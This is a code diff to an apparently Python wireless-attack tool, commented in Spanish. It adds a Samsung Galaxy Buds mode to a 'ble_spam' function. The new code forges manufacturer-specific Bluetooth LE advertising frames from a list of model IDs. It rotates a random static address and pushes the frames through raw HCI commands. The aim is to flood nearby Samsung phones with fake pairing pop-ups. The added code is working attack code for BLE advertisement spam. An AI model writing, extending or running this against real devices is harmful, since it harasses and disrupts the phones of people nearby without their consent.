@@ -1249,6 +1249,40 @@ def _build_adv_payload(item, max_len=31):
     return bytes(out[:max_len])
 
 
+def _random_static_address():
+    """Genera una direccion BLE aleatoria estatica.
+    El octeto mas significativo se entrega con los bits 11 al HCI.
+    """
+    addr = bytearray(os.urandom(6))
+    addr[5] |= 0xC0
+    # LE Set Random Address recibe BD address en formato little-endian.
+    return list(reversed(addr))
+
+
+def _build_samsung_buds_payload():
+    """Construye el paquete Galaxy Buds usado por Bruce/FastPair.
+    Samsung EasySetup reconoce la trama completa manufacturer-specific.
+    """
+    models = (
+        0xEE7A0C, 0x9D1700, 0x39EA48, 0xA7C62C, 0x850116,
+        0x3D8F41, 0x3B6D02, 0xAE063C, 0xB8B905, 0xEAAA17,
+        0xD30704, 0x9DB006, 0x101F1A, 0x859608, 0x8E4503,
+        0x2C6740, 0x3F6718, 0x42C519, 0xAE073A, 0x011716,
+        0x123456, 0x654321, 0x789ABC, 0xDEF123, 0x456789,
+        0xABC123, 0x321654, 0x987654, 0x654987, 0x321987,
+    )
+    model = random.choice(models)
+    payload = [
+        27, 0xFF, 0x75, 0x00, 0x42, 0x09, 0x81, 0x02,
+        0x14, 0x15, 0x03, 0x21, 0x01, 0x09,
+        (model >> 16) & 0xFF, (model >> 8) & 0xFF, 0x01,
+        model & 0xFF, 0x06, 0x3C, 0x94, 0x8E,
+        0x00, 0x00, 0x00, 0x00, 0xC7, 0x00,
+        0x10, 0xFF, 0x75,
+    ]
+    return bytes(payload[:31])
+
+
 def ble_spam(iface=DEFAULT_IFACE, seconds=20, mode="names", period_s=1.0):
     """BLE spam via HCI raw commands (hcitool). Rotamos LE Set Advertising
     Data cada `period_s` segundos durante `seconds`.
@@ -1310,8 +1344,20 @@ def ble_spam(iface=DEFAULT_IFACE, seconds=20, mode="names", period_s=1.0):
     last_name = ""
     t_end = time.time() + seconds
     while time.time() < t_end:
-        item = random.choice(pool)
-        payload = _build_adv_payload(item)
+        if mode.startswith("samsung"):
+            payload = _build_samsung_buds_payload()
+            n = "Galaxy Buds (Samsung EasySetup)"
+            r_disable = _hci(iface, 0x000A, [0x00])
+            r_addr = _hci(iface, 0x0005, _random_static_address())
+            if (r_disable is None or r_disable.returncode != 0 or
+                    r_addr is None or r_addr.returncode != 0):
+                failed_commands += 1
+                time.sleep(period)
+                continue
+        else:
+            item = random.choice(pool)
+            payload = _build_adv_payload(item)
+            n = item.get("name", "")
         if not payload:
             continue
         padded = payload + bytes(31 - len(payload))
@@ -1323,7 +1369,6 @@ def ble_spam(iface=DEFAULT_IFACE, seconds=20, mode="names", period_s=1.0):
             time.sleep(period)
             continue
         cycles += 1
-        n = item.get("name", "")
         if n:
             uniq_names.add(n); last_name = n
         time.sleep(period)
